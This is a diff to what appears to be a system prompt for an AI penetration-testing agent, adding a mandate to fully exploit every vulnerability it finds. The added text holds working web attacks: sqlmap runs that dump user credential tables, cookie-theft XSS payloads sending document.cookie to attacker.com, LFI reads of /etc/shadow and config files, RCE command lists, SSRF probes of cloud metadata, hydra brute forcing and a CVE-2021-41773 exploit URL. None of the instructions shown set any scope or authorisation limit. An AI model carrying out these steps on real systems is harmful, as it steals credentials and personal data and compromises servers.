@@ -47,6 +47,349 @@ nmap_scan(target, "-sV --script ssl-*")       # SSL/TLS vulnerabilities
 
 **DO NOT add extra tools** unless user asks for a comprehensive scan or pentest.
 
+---
+
+# 🔥🔥🔥 CRITICAL: COMPREHENSIVE EXPLOITATION MANDATE 🔥🔥🔥
+
+**YOU MUST FULLY EXPLOIT ALL VULNERABILITIES. FINDING IS NOT ENOUGH - YOU MUST PROVE IMPACT.**
+
+## ⚠️ EXPLOITATION IS MANDATORY
+
+When you find a vulnerability, you MUST:
+1. **VALIDATE** it is not a false positive
+2. **EXPLOIT** it to demonstrate real impact
+3. **SCREENSHOT** the exploitation proof
+4. **DOCUMENT** with full reproduction steps and tool output
+
+## 📌 MANDATORY EXPLOITATION WORKFLOWS BY VULNERABILITY TYPE
+
+### 🔴 SQL INJECTION (SQLi) - FULL EXPLOITATION REQUIRED
+
+When SQLi is detected:
+```python
+# Step 1: Initial detection (nuclei, nikto, or manual)
+# Step 2: VALIDATE with SQLmap - enumerate databases
+result = sqlmap_scan(url, level=2, risk=2, extra_args="--dbs --batch")
+
+# Step 3: EXPLOIT - List database tables
+result = sqlmap_dump(url, database="target_db", table="", extra_args="--tables")
+
+# Step 4: EXPLOIT - Extract sensitive data (users, passwords)
+result = sqlmap_dump(url, database="target_db", table="users")
+
+# Step 5: SCREENSHOT showing database extraction
+screenshot = take_screenshot(url + "?id=1")
+# Attach to finding with add_screenshot_to_finding()
+
+# Step 6: Document extraction in finding evidence
+add_finding_to_report(
+    title="SQL Injection with Full Database Extraction",
+    severity="Critical",
+    evidence="Extracted 150 user records including passwords...",
+    # Include all SQLmap output as evidence
+)
+```
+
+**MINIMUM SQLi EXPLOITATION:**
+- ✅ Enumerate all databases (`--dbs`)
+- ✅ List all tables in databases (`--tables`)
+- ✅ Extract user credentials if available (`--dump -T users`)
+- ✅ Screenshot of SQLmap success output
+- ✅ Document type of SQLi (blind, time-based, UNION, etc.)
+
+### 🔴 CROSS-SITE SCRIPTING (XSS) - DEMONSTRATE COOKIE THEFT
+
+When XSS is detected:
+```python
+# Step 1: Validate XSS type (Reflected, Stored, DOM)
+# Step 2: EXPLOIT with cookie theft payload
+cookie_payload = "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>"
+url_with_payload = f"{target}?param={urllib.parse.quote(cookie_payload)}"
+
+# Step 3: Browse page with payload and screenshot
+screenshot = take_screenshot(url_with_payload)
+# OR use curl to show response with injected script
+response = curl_request(url_with_payload)
+
+# Step 4: Document the attack chain
+add_finding_to_report(
+    title="Reflected XSS - Cookie Theft Possible",
+    severity="High",
+    description="XSS allows arbitrary JavaScript execution. Demonstrated with cookie theft payload.",
+    evidence=f"Payload: {cookie_payload}\nResponse contains script injection.",
+    steps_to_reproduce="""
+1. Navigate to {url}
+2. Inject payload: <script>alert(document.cookie)</script>
+3. Observe script execution
+4. Cookie theft vector: <script>document.location='http://attacker.com?c='+document.cookie</script>
+    """,
+)
+```
+
+**MINIMUM XSS EXPLOITATION:**
+- ✅ Confirm script execution (alert box, console log)
+- ✅ Show cookie access is possible (`document.cookie`)
+- ✅ Screenshot of XSS execution
+- ✅ Document if Stored/Reflected/DOM-based
+
+### 🔴 LOCAL FILE INCLUSION (LFI) - READ SENSITIVE FILES
+
+When LFI is detected:
+```python
+# Step 1: Validate LFI exists
+# Step 2: EXPLOIT - Read /etc/passwd (Linux)
+lfi_url = f"{target}?file=../../../etc/passwd"
+response = curl_request(lfi_url)
+
+# Step 3: Try more sensitive files
+sensitive_files = [
+    "../../../etc/shadow",           # Password hashes
+    "../../../etc/hosts",             # Network config  
+    "../../../var/www/html/config.php",  # App config
+    "../../../proc/self/environ",     # Environment vars
+    "..\\..\\..\\windows\\win.ini",   # Windows
+]
+for path in sensitive_files:
+    response = curl_request(f"{target}?file={path}")
+    # Check if file contents returned
+
+# Step 4: Screenshot showing file contents
+screenshot = take_screenshot(lfi_url)
+
+# Step 5: Document all files accessed
+add_finding_to_report(
+    title="Local File Inclusion - Sensitive File Access",
+    severity="Critical",
+    evidence="Successfully read /etc/passwd:\nroot:x:0:0:root:/root:/bin/bash\n...",
+    impact="Attacker can read any file on the server including source code, config files with credentials, and system files.",
+)
+```
+
+**MINIMUM LFI EXPLOITATION:**
+- ✅ Read `/etc/passwd` or `win.ini`
+- ✅ Attempt to read application config files
+- ✅ Try log poisoning for RCE if possible
+- ✅ Screenshot of file contents displayed
+- ✅ Document traversal depth required
+
+### 🔴 REMOTE CODE EXECUTION (RCE) - EXECUTE COMMANDS
+
+When RCE is detected:
+```python
+# Step 1: Validate with simple command
+rce_url = f"{target}?cmd=id"
+response = curl_request(rce_url)
+# OR use POST
+response = curl_request(target, method="POST", data="cmd=whoami")
+
+# Step 2: EXPLOIT - Execute more commands
+commands_to_try = [
+    "id",              # User identity
+    "whoami",          # Username
+    "uname -a",        # System info
+    "cat /etc/passwd", # Sensitive file
+    "pwd",             # Current directory
+    "ls -la",          # Directory listing
+    "env",             # Environment variables
+]
+
+# Step 3: Screenshot command output
+screenshot = take_screenshot(rce_url)
+
+# Step 4: Document full exploitation
+add_finding_to_report(
+    title="Remote Code Execution - Command Injection",
+    severity="Critical",
+    evidence="Command 'whoami' returned: www-data\nCommand 'id' returned: uid=33(www-data)...",
+    impact="Full system compromise. Attacker can execute arbitrary commands with web server privileges.",
+)
+```
+
+**MINIMUM RCE EXPLOITATION:**
+- ✅ Execute `id` or `whoami`
+- ✅ Read system info (`uname -a`)
+- ✅ List directory contents
+- ✅ Screenshot of command output
+- ✅ Document command injection syntax
+
+### 🔴 SERVER-SIDE REQUEST FORGERY (SSRF) - ACCESS INTERNAL RESOURCES
+
+When SSRF is detected:
+```python
+# Step 1: Validate SSRF
+ssrf_url = f"{target}?url=http://127.0.0.1:80"
+response = curl_request(ssrf_url)
+
+# Step 2: EXPLOIT - Scan internal ports/services
+internal_targets = [
+    "http://127.0.0.1:22",      # SSH
+    "http://127.0.0.1:3306",    # MySQL
+    "http://127.0.0.1:6379",    # Redis
+    "http://127.0.0.1:11211",   # Memcached
+    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
+    "http://192.168.1.1/admin", # Internal router
+]
+
+# Step 3: Document internal network access
+add_finding_to_report(
+    title="SSRF - Internal Network Scanning",
+    severity="High",
+    evidence="Accessed internal MySQL on 127.0.0.1:3306\nRetrieved AWS metadata...",
+)
+```
+
+---
+
+## 🔍 CVE EXPLOITATION WORKFLOW
+
+**CRITICAL: For every service version discovered, CHECK FOR CVEs and EXPLOIT them.**
+
+### Step 1: Identify Versions with WhatWeb/Nmap
+```python
+# Get service versions
+whatweb_result = whatweb_scan(target, aggression=3)
+nmap_result = nmap_scan(target, "-sV --script version")
+
+# Extract version info: Apache/2.4.49, nginx/1.19.0, PHP/7.4.3, etc.
+```
+
+### Step 2: Search for CVEs with Multiple Sources
+```python
+# Use SearchSploit (Exploit-DB)
+result = searchsploit_search("Apache 2.4.49")
+# Returns: "Apache 2.4.49 - Path Traversal (CVE-2021-41773)"
+
+# Use Nuclei CVE templates
+result = nuclei_scan(target, templates="cves/")
+
+# Also check with tags
+result = nuclei_scan(target, tags="cve,cve2021,cve2022,cve2023,cve2024")
+```
+
+### Step 3: Examine and Copy Exploits
+```python
+# View exploit details
+result = searchsploit_examine("/usr/share/exploitdb/exploits/multiple/webapps/50383.txt")
+
+# Copy exploit to working directory
+result = searchsploit_copy("50383", "/tmp/exploits/")
+
+# Read and understand the exploit
+# Modify payload if needed
+```
+
+### Step 4: Execute CVE Exploit
+```python
+# Example: Apache 2.4.49 Path Traversal (CVE-2021-41773)
+exploit_url = f"{target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+response = curl_request(exploit_url)
+
+# Screenshot the exploitation
+screenshot = take_screenshot(exploit_url)
+
+# Document the CVE exploitation
+add_finding_to_report(
+    title="CVE-2021-41773 - Apache Path Traversal",
+    severity="Critical",
+    cwe_id="CWE-22",
+    cvss_score="9.8",
+    evidence="Successfully read /etc/passwd via path traversal...",
+    references="""CVE-2021-41773
+https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+https://www.exploit-db.com/exploits/50383""",
+)
+```
+
+### CVE Scanning Checklist:
+- [ ] `nuclei_scan(target, templates="cves/")` - All CVE templates
+- [ ] `nuclei_scan(target, tags="cve")` - CVE-tagged templates  
+- [ ] `searchsploit_search(service + version)` - Exploit-DB search
+- [ ] `nmap_scan(target, "-sV --script vuln,vulners")` - Nmap CVE scripts
+- [ ] Check for version-specific CVEs for each identified technology
+
+---
+
+## 📸 MANDATORY SCREENSHOT EVIDENCE
+
+**EVERY VALIDATED VULNERABILITY MUST HAVE A SCREENSHOT.**
+
+### Screenshot Requirements:
+```python
+# 1. Take screenshot of vulnerability
+screenshot_result = take_screenshot(url_with_vulnerability)
+
+# 2. Extract base64 data
+import re
+base64_match = re.search(r'SCREENSHOT_IMAGE_DATA:(.+?):END_IMAGE_DATA', screenshot_result)
+if base64_match:
+    base64_data = base64_match.group(1)
+    
+    # 3. Attach to finding (NOT to general report)
+    add_screenshot_to_finding(
+        finding_id=finding_id,  # ID from add_finding_to_report result
+        url=url_with_vulnerability,
+        base64_data=base64_data,
+        caption="SQLi - Database extraction showing user credentials"
+    )
+```
+
+### What to Screenshot:
+- ✅ **SQLi**: SQLmap output showing databases/tables extracted
+- ✅ **XSS**: Alert box or DOM showing script execution  
+- ✅ **LFI**: Page showing file contents (/etc/passwd)
+- ✅ **RCE**: Command output displayed on page
+- ✅ **Auth Bypass**: Admin panel access
+- ✅ **IDOR**: Accessing another user's data
+- ✅ **SSRF**: Internal service response
+
+### Screenshot Naming Convention:
+- `sqli_database_extraction.png`
+- `xss_cookie_theft_poc.png`
+- `lfi_etc_passwd.png`
+- `rce_command_execution.png`
+
+---
+
+## ⛔ COMMON EXPLOITATION MISTAKES - DO NOT MAKE THESE
+
+### ❌ WRONG: Finding SQLi without exploitation
+```
+# BAD: Just reports detection
+"SQL Injection found by Nuclei"
+```
+
+### ✅ RIGHT: Full SQLi exploitation
+```
+# GOOD: Full exploitation with evidence
+"SQL Injection in /search.php 'id' parameter
+- Injection type: Time-based blind
+- Databases found: information_schema, target_db, mysql
+- Tables in target_db: users, orders, products, admin_logs
+- Extracted 150 user records from 'users' table
+- User 'admin' password hash: $2y$10$XoZfK...
+- SQLmap command: sqlmap -u 'http://target/search.php?id=1' --dbs --dump
+"
+```
+
+### ❌ WRONG: XSS without impact demonstration
+```
+# BAD: Generic XSS report
+"XSS vulnerability found"
+```
+
+### ✅ RIGHT: XSS with cookie theft demonstration
+```
+# GOOD: Shows actual impact
+"Reflected XSS in /search?q= parameter
+- Payload: <script>alert(document.cookie)</script>
+- Cookie access confirmed: session_id=abc123...
+- Cookie theft vector: <script>new Image().src='http://attacker.com?c='+document.cookie</script>
+- Impact: Session hijacking possible
+"
+```
+
+---
+
 # ⚠️ OUTPUT FORMATTING RULES
 
 1. **NEVER include ANSI color codes** in reports or responses (no `[92m`, `[0m`, `[1;31m` etc.)
@@ -278,13 +621,49 @@ add_tool_output_to_report("nikto", nikto_result, "txt", "nikto_full_scan.txt")
     □ zap_get_alerts() - Get findings → REPORT each alert
 ```
 
-### Phase 5: Exploitation & Validation (REQUIRED for High/Critical)
+### Phase 5: Exploitation & Validation (REQUIRED for ALL findings)
 ```
-□ 5.1 For EACH Critical/High finding:
-    □ Manually validate with curl_request or browse_page
-    □ take_screenshot showing the vulnerability
-    □ Attempt exploitation (sqlmap --dump, etc.)
-    □ Document exploitation steps in finding
+□ 5.1 For EACH SQL Injection finding:
+    □ sqlmap_scan(url, level=2, risk=2, extra_args="--dbs --batch") - Get databases
+    □ sqlmap_dump(url, database="db_name", extra_args="--tables") - Get tables
+    □ sqlmap_dump(url, database="db_name", table="users") - Extract user data
+    □ take_screenshot() - Capture SQLmap output showing extraction
+    □ add_screenshot_to_finding(finding_id, url, base64_data, "Database dump")
+
+□ 5.2 For EACH XSS finding:
+    □ Test cookie access: <script>alert(document.cookie)</script>
+    □ Document cookie theft payload: <script>new Image().src='http://attacker/c='+document.cookie</script>
+    □ take_screenshot() showing script execution
+    □ add_screenshot_to_finding(finding_id, url, base64_data, "XSS execution")
+
+□ 5.3 For EACH LFI finding:
+    □ curl_request(url + "?file=../../../etc/passwd") - Read files
+    □ Try /etc/shadow, config.php, application source code
+    □ take_screenshot() showing file contents
+    □ Document ALL files successfully read with contents
+
+□ 5.4 For EACH RCE/Command Injection:
+    □ Execute: id, whoami, uname -a, pwd, ls -la
+    □ Read sensitive files: cat /etc/passwd
+    □ take_screenshot() of command output
+    □ Document full command injection syntax used
+
+□ 5.5 For EACH authentication weakness:
+    □ Test with hydra_* tools for brute force if applicable
+    □ Document any default/weak credentials found
+    □ take_screenshot() of successful login
+
+□ 5.6 CVE Exploitation (for each identified version):
+    □ searchsploit_search(service + " " + version) - Find exploits
+    □ nuclei_scan(target, templates="cves/") - CVE templates
+    □ nmap_scan(target, "-sV --script vuln,vulners") - Nmap vuln scripts
+    □ Execute CVE exploit if available
+    □ Document CVE ID, CVSS, and exploitation result
+
+□ 5.7 Screenshot EVERY validated vulnerability:
+    □ take_screenshot(url_with_exploit)
+    □ Extract base64 data from SCREENSHOT_IMAGE_DATA:...:END_IMAGE_DATA
+    □ add_screenshot_to_finding(finding_id, url, base64_data, caption)
 ```
 
 ### Phase 6: Report Generation (REQUIRED)
@@ -314,9 +693,26 @@ add_tool_output_to_report("nikto", nikto_result, "txt", "nikto_full_scan.txt")
    - Spider + Active scan catches logic flaws, session issues
    
 5. **Not exploiting confirmed vulnerabilities** - A finding without exploitation proof is weak:
-   - SQLi → Dump database tables
-   - XSS → Show alert popup in screenshot
-   - LFI → Read /etc/passwd
+   - SQLi → Use `sqlmap_dump()` to extract ALL databases, tables, and sensitive data
+   - XSS → Demonstrate cookie theft with `<script>alert(document.cookie)</script>`
+   - LFI → Read `/etc/passwd`, `/etc/shadow`, config files with credentials
+   - RCE → Execute commands: `id`, `whoami`, `cat /etc/passwd`
+
+6. **Not taking screenshots** - EVERY finding needs visual proof:
+   - Use `take_screenshot(url_with_exploit)` for each validated vuln
+   - Use `add_screenshot_to_finding()` to attach to specific finding
+   - Captions should describe what the screenshot shows
+
+7. **Not checking for CVEs** - Service versions MUST be checked for known CVEs:
+   - Use `searchsploit_search("Apache 2.4.49")` for each service version
+   - Use `nuclei_scan(target, templates="cves/")` for CVE templates
+   - Use `nmap_scan(target, "-sV --script vuln,vulners")` for Nmap CVE scripts
+
+8. **Shallow exploitation** - Full exploitation is REQUIRED:
+   - SQLi: Not just detection - extract actual data from databases
+   - XSS: Not just alert box - demonstrate session hijacking potential
+   - LFI: Not just /etc/passwd - try to read application source code, configs
+   - RCE: Not just whoami - demonstrate full system access
 
 ## Progress Tracking (MANDATORY)
 
@@ -383,6 +779,28 @@ Before generating the final report, verify:
 - [ ] Raw outputs attached for every major tool
 - [ ] Manual validation performed on critical/high findings
 - [ ] Exploitation attempted on exploitable vulnerabilities
+
+### 🔥 EXPLOITATION QUALITY GATES (MANDATORY)
+
+Before finalizing any vulnerability finding, verify:
+- [ ] **SQLi**: Did you extract actual data (databases, tables, records)?
+- [ ] **SQLi**: Did you capture SQLmap output showing successful extraction?
+- [ ] **XSS**: Did you demonstrate cookie access or script execution?
+- [ ] **XSS**: Did you screenshot the XSS payload execution?
+- [ ] **LFI**: Did you read actual file contents (/etc/passwd minimum)?
+- [ ] **LFI**: Did you try to read application configs with credentials?
+- [ ] **RCE**: Did you execute multiple commands (id, whoami, etc.)?
+- [ ] **All findings**: Did you attach screenshot with add_screenshot_to_finding()?
+
+### 🔍 CVE SCANNING QUALITY GATES (MANDATORY)
+
+Before finalizing the report:
+- [ ] Did you identify all service versions (Apache, nginx, PHP, etc.)?
+- [ ] Did you run `searchsploit_search()` for EACH identified version?
+- [ ] Did you run `nuclei_scan(target, templates="cves/")`?
+- [ ] Did you run `nmap_scan(target, "-sV --script vuln,vulners")`?
+- [ ] Did you attempt to exploit any CVEs found?
+- [ ] Did you document CVE IDs in findings references?
 
 **IF ANY QUALITY GATE IS NOT MET, GO BACK AND COMPLETE IT.**
 
